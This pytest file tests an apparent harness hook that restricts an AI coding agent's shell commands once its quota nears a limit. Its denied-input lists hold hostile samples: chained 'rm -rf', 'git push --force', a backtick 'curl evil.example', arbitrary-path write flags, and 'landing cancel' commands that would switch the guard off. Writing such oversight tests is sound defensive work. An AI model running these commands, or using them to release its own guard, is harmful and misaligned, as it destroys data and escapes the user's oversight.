"""Regression tests for the LAND-state command gate and snapshot trust."""

from pathlib import Path
from time import time

import pytest

from agent_landing.hooks import is_safe_landing_command, pre_tool
from agent_landing.models import LandingState, QuotaSnapshot, QuotaWindow, TaskSession
from agent_landing.policy import evaluate
from agent_landing.state import StateStore


def store_at(tmp_path: Path, remaining: float, age_seconds: float = 0.0) -> StateStore:
    store = StateStore(tmp_path)
    store.save_session(TaskSession(
        task="implement auth",
        provider="claude",
        window="seven_day",
        floor_percent=70,
        started_remaining_percent=90,
        cwd=str(tmp_path),
    ))
    store.save_snapshot(QuotaSnapshot(
        provider="claude",
        windows=[QuotaWindow(id="seven_day", used_percent=100 - remaining)],
        sampled_at=time() - age_seconds,
    ))
    return store


# --- LAND allowlist cannot be escaped by chaining or redirecting ---------------

@pytest.mark.parametrize("command", [
    "git status && python -c \"open('x','w').write('y')\"",
    "git status; rm -rf build",
    "git diff | tee patch.txt",
    "git status > out.txt",
    "git diff >> out.txt",
    "git status `curl evil.example`",
    "git status $(rm -rf build)",
    "pytest -q && git push --force",
    "pytest -q\nrm -rf build",
])
def test_land_allowlist_rejects_shell_escapes(command):
    assert not is_safe_landing_command(command)


@pytest.mark.parametrize("command", [
    "git status",
    "git status --short",
    "git diff",
    "git diff src/agent_landing/policy.py",
    "git log -1",
    "git log -1 --stat",
    "git branch --show-current",
    "git rev-parse HEAD",
    "pytest",
    "pytest -q",
    "python -m pytest tests/test_policy.py",
])
def test_land_allowlist_still_permits_real_inspection(command):
    assert is_safe_landing_command(command)


def test_land_denies_chained_command_end_to_end(tmp_path):
    store = store_at(tmp_path, 73.5)
    result = pre_tool(
        {"tool_name": "Bash", "tool_input": {"command": "git status && python -c \"open('x','w')\""}},
        store,
    )
    assert result["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_land_allows_plain_git_status_end_to_end(tmp_path):
    store = store_at(tmp_path, 73.5)
    result = pre_tool({"tool_name": "Bash", "tool_input": {"command": "git status"}}, store)
    assert result.get("hookSpecificOutput", {}).get("permissionDecision") != "deny"


# --- A stale snapshot is not evidence of headroom -----------------------------

def test_fresh_snapshot_with_ample_quota_is_normal(tmp_path):
    session = store_at(tmp_path, 91.0).load_session()
    assert evaluate(session, 91.0, snapshot_age_seconds=5.0).state == LandingState.NORMAL


def test_stale_snapshot_downgrades_normal_to_conserve(tmp_path):
    session = store_at(tmp_path, 91.0).load_session()
    decision = evaluate(session, 91.0, snapshot_age_seconds=3 * 86400)
    assert decision.state == LandingState.CONSERVE
    assert "cannot be trusted" in decision.reason


def test_stale_snapshot_never_relaxes_a_stricter_state(tmp_path):
    """Staleness may only tighten. A real LAND reading stays LAND."""
    session = store_at(tmp_path, 73.5).load_session()
    assert evaluate(session, 73.5, snapshot_age_seconds=3 * 86400).state == LandingState.LAND


def test_stale_snapshot_does_not_resurrect_a_stopped_session(tmp_path):
    session = store_at(tmp_path, 91.0).load_session()
    session.state = LandingState.STOPPED
    session.stop_reason = "landed"
    assert evaluate(session, 91.0, snapshot_age_seconds=3 * 86400).state == LandingState.STOPPED


# --- arguments are allowlisted too, not just the command --------------------

@pytest.mark.parametrize("command", [
    # Writing flags turn a read-only command into an arbitrary-path write.
    "git diff --output=pwned.txt",
    "git diff -o pwned.txt",
    "git log -1 --output=pwned.txt",
    "pytest --junitxml=pwned.xml",
    "python -m pytest --junitxml=pwned.xml",
    "pytest --junit-xml=pwned.xml",
    "pytest --result-log=pwned.log",
    # An unrecognized flag is refused rather than passed through, so the next
    # writing flag anyone adds to git or pytest is already covered.
    "pytest --some-future-flag=pwned.txt",
    "git status --some-future-flag=pwned.txt",
])
def test_a_writing_flag_cannot_ride_along_on_an_allowlisted_command(command):
    """Regression for the second leak of one bug class.

    The check allowlisted the command and then accepted any arguments, which is
    a blocklist wearing an allowlist's name. It leaked first through chaining
    (`git status && <any write>`) and then through these. Flags are now
    default-deny, so the class is closed rather than patched twice.
    """
    assert is_safe_landing_command(command) is False


@pytest.mark.parametrize("command", [
    "git status",
    "git status --short",
    "git status -s -b",
    "git diff",
    "git diff --stat",
    "git diff --cached src/x.py",
    "git log -1 --format=%H",
    "git branch --show-current",
    "git rev-parse --show-toplevel",
    "pytest",
    "pytest -q",
    "pytest --tb=short tests/",
    "python -m pytest -x -k auth",
])
def test_the_inspection_an_agent_needs_to_write_a_handoff_still_works(command):
    """Default-deny must not cost the agent the reads it needs in order to land."""
    assert is_safe_landing_command(command) is True


def test_unbalanced_quoting_is_refused_rather_than_guessed_at():
    assert is_safe_landing_command('git status --short "') is False


# --- the agent may not stand the guard down, in any state -------------------

@pytest.mark.parametrize("command", [
    "landing cancel",
    "python -m agent_landing.cli cancel",
    # A bare `landing complete` is allowed to end the task (it freezes the turn;
    # see test_complete_and_status.py); anything riding along with it is not.
    "landing complete && landing cancel",
    "landing complete --force",
    "landing resume",
    "landing start --leave 5 --task x",
])
def test_an_agent_cannot_release_the_guard_even_in_normal(tmp_path, command):
    """The gate guards the floor; releasing the guard is not a spend.

    Checked in every state, not only past the boundary. `landing cancel` run as
    a tool call in NORMAL removed the floor before the gate had an opinion --
    the same hole the start ratchet closed, and widened once a terminal cancel
    began ending every budget rather than one.
    """
    store = store_at(tmp_path, remaining=95.0)
    payload = {"tool_name": "Bash", "tool_input": {"command": command}, "tool_use_id": "r1"}
    result = pre_tool(payload, store)
    assert result["hookSpecificOutput"]["permissionDecision"] == "deny"
    assert "the user's to do" in result["hookSpecificOutput"]["permissionDecisionReason"]


@pytest.mark.parametrize("command", [
    "landing status",
    "landing doctor",
    "git status",
    "npm start",
    "restart the dev server",
])
def test_reading_landing_state_and_ordinary_work_are_untouched(tmp_path, command):
    """Only the verbs that weaken the contract are refused."""
    store = store_at(tmp_path, remaining=95.0)
    payload = {"tool_name": "Bash", "tool_input": {"command": command}, "tool_use_id": "r2"}
    assert pre_tool(payload, store) == {}
